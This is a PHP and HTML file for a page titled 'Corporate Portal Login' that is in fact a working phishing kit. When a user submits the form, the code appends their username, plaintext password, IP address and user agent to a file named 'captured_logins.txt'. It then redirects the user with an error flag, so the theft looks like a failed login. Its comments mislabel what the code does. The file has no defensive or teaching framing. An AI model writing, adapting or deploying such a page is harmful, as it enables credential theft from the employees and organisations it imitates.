<?php
// Server portal
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $username = $_POST['username'];
    $password = $_POST['password'];
    $ip = $_SERVER['REMOTE_ADDR'];
    $user_agent = $_SERVER['HTTP_USER_AGENT'];
    $time = date('Y-m-d H:i:s');
    
    //  databse credentials
    $log_entry = "Time: $time | IP: $ip | UserAgent: $user_agent | Username: $username | Password: $password\n";
    file_put_contents('captured_logins.txt', $log_entry, FILE_APPEND);
    
    // Redirect after successful login
    header('Location: https://corporate.portallogin?error=1');
    exit();
}


// This is a simple HTML form for the login page
?>
<!DOCTYPE html>
<html>
<head>
    <title>Corporate Portal Login</title>
    <style>
        body { font-family: Arial, sans-serif; background: #f5f5f5; }
        .login-box { width: 300px; margin: 100px auto; padding: 20px; background: white; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
        input { width: 100%; padding: 10px; margin: 8px 0; box-sizing: border-box; }
        button { background: #0066cc; color: white; padding: 10px; border: none; width: 100%; }
        .logo { text-align: center; margin-bottom: 20px; }
    </style>
</head>
<body>
    <div class="login-box">
        <div class="logo">
            <h2>Corporate Portal</h2>
        </div>
        <form method="POST">
            <input type="text" name="username" placeholder="Username" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Login</button>
        </form>
        <p style="text-align: center; font-size: 12px; margin-top: 20px;">
            Having trouble? Contact IT Support.
        </p>
    </div>
</body>
</html>